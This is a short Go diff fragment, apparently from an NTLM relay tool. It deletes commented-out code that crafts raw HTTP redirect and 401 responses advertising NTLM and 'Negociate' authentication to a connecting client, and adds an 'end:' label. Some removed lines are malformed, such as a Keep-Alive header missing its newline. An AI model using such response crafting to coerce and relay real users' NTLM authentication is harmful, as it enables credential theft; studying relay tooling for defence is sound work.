-		// 	clientInitialResponseByte := []byte(
-		// 		"HTTP/1.1 307 Temporary Redirect\n" +
-		// 			"Location: /" + randomPath + " \n" +
-		// 			// "WWW-Authenticate: NTLM\n" +
-		// 			// "WWW-Authenticate: Negociate\n" +
-		// 			"Connection: keep-alive\n" +
-		// 			"Content-Length: 0\n" +
-		// 			"\n\n")
-
-		// 	// clientInitialResponseByte := []byte(
-		// 	// 	"HTTP/1.1 200 OK\n" +
-		// 	// 		"WWW-Authenticate: NTLM\n" +
-		// 	// 		"WWW-Authenticate: Negociate\n" +
-		// 	// 		"Connection: keep-alive\n" +
-		// 	// 		"Keep-Alive: timeout=8888888888888888, max=88888888" +
-		// 	// 		"Content-Length: 0\n" +
-		// 	// 		"\n\n\n")
-
-		// 	n.clientConn.Write(clientInitialResponseByte)
-		// 	for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
-		// 		fmt.Fprintf(logger.Writer(), "%s | %s | client <- gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
-		// 	}
-		// 	logger.Fprint(logger.Writer(), "\n")
-
-		// 	// clientWWWAuthenticateResponseByte := []byte(
-		// 	// 	"HTTP/1.1 401 Unauthorized\n" +
-		// 	// 		"WWW-Authenticate: NTLM\n" +
-		// 	// 		"WWW-Authenticate: Negociate\n" +
-		// 	// 		"Connection: keep-alive\n" +
-		// 	// 		"Keep-Alive: timeout=8888888888888888, max=88888888" +
-		// 	// 		"Content-Length: 0\n" +
-		// 	// 		"\n\n\n")
-
-		// 	break
-		// }
-		// /*
-		//  * End Message Type 3
-		//  */
-
 	}
 
+end:
 	n.Relays[currentRelay.target] = &currentRelay
 
 	return nil
